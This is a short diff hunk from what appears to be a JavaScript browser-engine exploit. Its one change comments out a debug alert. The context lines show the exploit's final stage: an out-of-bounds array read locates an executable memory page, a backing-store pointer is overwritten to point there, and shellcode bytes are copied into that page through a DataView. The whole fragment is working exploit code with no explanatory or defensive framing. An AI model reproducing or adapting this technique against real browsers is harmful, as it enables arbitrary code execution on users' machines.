@@ -108,7 +108,7 @@ function gc() {
   let rwx = flow(oob_arr[7]);
   //alert("rwx: " + rwx.toString(16));
   arr[5] = i2f(rwx, 0x1000);
-  alert("backingStore");
+  //alert("backingStore");
   for (let i = 0; i < shellcode.length; i++) {
     rw_view.setInt8(i, shellcode[i]);
   }
